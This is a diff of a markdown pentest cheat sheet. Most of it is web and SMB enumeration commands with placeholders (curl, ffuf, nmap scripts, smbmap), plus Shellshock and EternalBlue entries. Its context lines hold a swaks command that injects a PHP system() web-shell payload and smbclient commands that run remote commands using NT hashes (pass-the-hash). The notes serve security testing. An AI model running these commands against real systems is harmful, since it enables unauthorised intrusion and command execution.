@@ -25,13 +25,13 @@ swaks -f 'FREENAME@DOMAINNAME' -t 'TO_USERNAME@DOMAINNAME' -d '<?php system($_RE
 ## 80
 ### cadaver
 ```sh
-cadaver http://IP
+cadaver 'URL'
 ```
 ### curl
 ```sh
-curl -I http://'IP'
-curl -X OPTIONS -I http://'IP'
-curl -ks
+curl -I 'URL'
+curl -X OPTIONS -I 'URL'
+curl -ks 'URL'
 ```
 ### davtest
 ```sh
@@ -46,8 +46,7 @@ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ```sh
 nmap -n -Pn -p80 --script=http-methods 'IP'
 ```
-### PoC
-#### rce
+### CVE
 - shellshock
   ```sh
   # CVE-2014-6271
@@ -213,6 +212,11 @@ smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
 smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g 'OUTPUT.txt'
 smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g 'OUTPUT.txt'
 ```
+### CVE
+- eternalblue
+  ```sh
+  nmap -n -Pn -p445 --script=smb-vuln-ms17-010 'IP'
+  ```
 
 
 
